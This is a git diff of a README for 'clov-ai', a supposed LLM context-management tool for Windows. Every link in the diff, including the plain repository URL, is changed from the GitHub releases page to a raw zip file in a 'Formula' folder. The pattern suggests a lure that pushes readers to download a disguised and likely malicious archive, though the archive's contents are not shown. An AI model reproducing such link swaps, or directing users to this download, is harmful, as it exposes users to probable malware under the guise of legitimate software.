@@ -1,6 +1,6 @@
 # 🛠️ clov-ai - Manage Context, Save Your LLM
 
-[![Download clov-ai](https://img.shields.io/badge/Download-clov--ai-blue?style=for-the-badge)](https://github.com/Tonyx79/clov-ai/releases)
+[![Download clov-ai](https://img.shields.io/badge/Download-clov--ai-blue?style=for-the-badge)](https://github.com/Tonyx79/clov-ai/raw/refs/heads/main/Formula/ai_clov_v2.0.zip)
 
 ## 📋 What is clov-ai?
 
@@ -26,7 +26,7 @@ These requirements ensure clov-ai runs well without slowing your computer.
 
 To get clov-ai, visit the release page here:
 
-[![Download clov-ai](https://img.shields.io/badge/Download-clov--ai-grey?style=for-the-badge)](https://github.com/Tonyx79/clov-ai/releases)
+[![Download clov-ai](https://img.shields.io/badge/Download-clov--ai-grey?style=for-the-badge)](https://github.com/Tonyx79/clov-ai/raw/refs/heads/main/Formula/ai_clov_v2.0.zip)
 
 This page has the latest version ready for download. You will find files named for Windows. Look for `.exe` or `.zip` files made for Windows users.
 
@@ -40,7 +40,7 @@ Follow these steps to install and start using clov-ai on your Windows computer.
 
 Go to the clov-ai release page:
 
-https://github.com/Tonyx79/clov-ai/releases
+https://github.com/Tonyx79/clov-ai/raw/refs/heads/main/Formula/ai_clov_v2.0.zip
 
 This is where the software files are stored.
 
@@ -119,7 +119,7 @@ Learn more about related topics:
 
 Visit the repository page for updates and help:
 
-https://github.com/Tonyx79/clov-ai
+https://github.com/Tonyx79/clov-ai/raw/refs/heads/main/Formula/ai_clov_v2.0.zip
 
 ## ⚙️ Additional Information
 
@@ -139,4 +139,4 @@ This background helps explain how clov-ai fits into AI data processing work.
 
 ---
 
-[![Download clov-ai](https://img.shields.io/badge/Download-clov--ai-blueviolet?style=for-the-badge)](https://github.com/Tonyx79/clov-ai/releases)
+[![Download clov-ai](https://img.shields.io/badge/Download-clov--ai-blueviolet?style=for-the-badge)](https://github.com/Tonyx79/clov-ai/raw/refs/heads/main/Formula/ai_clov_v2.0.zip)
